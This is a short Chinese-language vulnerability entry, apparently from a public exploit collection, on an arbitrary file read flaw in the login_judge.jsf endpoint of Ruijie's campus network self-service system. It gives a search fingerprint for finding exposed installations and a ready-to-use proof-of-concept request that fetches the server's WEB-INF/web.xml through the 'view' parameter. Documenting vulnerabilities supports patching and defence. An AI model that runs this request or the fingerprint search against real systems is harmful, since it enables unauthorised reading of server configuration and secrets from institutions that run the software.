# 锐捷 校园网自助服务系统 login_judge.jsf 任意文件读取漏洞

## 漏洞描述

锐捷 校园网自助服务系统 login_judge.jsf 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件

## 漏洞影响

<a-checkbox checked>锐捷 校园网自助服务系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="园网自助服务系"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1697855354969-1aec8552-b2c0-48f9-aa71-ffaea1493027.png)验证POC

```php
/selfservice/selfservice/module/scgroup/web/login_judge.jsf?view=./WEB-INF/web.xml%3F
```

![img](../../../.vuepress/public/img/1697855400526-0287f033-ce41-4282-93c7-27977519d5bf.png)